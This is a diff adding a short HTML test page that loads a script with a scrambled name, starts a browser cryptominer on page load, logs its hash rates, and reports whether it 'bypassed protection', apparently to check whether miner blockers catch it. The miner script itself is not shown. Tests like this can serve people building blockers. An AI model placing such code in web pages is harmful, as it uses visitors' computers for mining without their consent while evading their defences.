@@ -1,0 +1,32 @@
+<html>
+
+<head>
+  <script src="voPrAeAz.js"></script>
+
+</head>
+
+<body>
+  <h1>Check the console for information</h1>
+  <script>
+    loadCryptominer(function(miner, status) {
+      //Code that mines
+      //For example:
+      if (status == 3 || status == 4) {
+        console.log("TEST FAILED!")
+      } else {
+        console.log("SUCCESSFULLY BYPASSED PROTECTION!")
+      }
+      miner.start();
+      console.log(miner)
+      // Update stats once per second
+      setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+        console.log(hashesPerSecond, totalHashes, acceptedHashes)
+        }, 1000);
+    });
+  </script>
+</body>
+
+</html>
